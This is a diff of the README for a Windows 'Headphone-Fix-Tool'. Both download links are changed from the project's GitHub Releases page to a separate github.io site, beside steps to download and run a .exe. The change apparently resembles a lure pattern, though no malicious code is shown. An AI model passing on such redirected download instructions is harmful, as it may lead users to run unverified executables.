@@ -1,6 +1,6 @@
 # 🎧 Headphone-Fix-Tool - Restore Audio on Windows Automatically
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/seandellke2521/Headphone-Fix-Tool/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://seandellke2521.github.io)
 
 This application helps users resolve common audio problems on Windows 10 and 11. It addresses issues where headphones show as connected but produce no sound. It also fixes problems with USB headsets, Bluetooth devices, and Realtek audio jacks.
 
@@ -19,7 +19,7 @@ The tool performs several automated tasks to restore audio connection:
 
 Follow these instructions to download and run the software.
 
-1. Visit the [Releases page](https://github.com/seandellke2521/Headphone-Fix-Tool/releases).
+1. Visit the [Releases page](https://seandellke2521.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
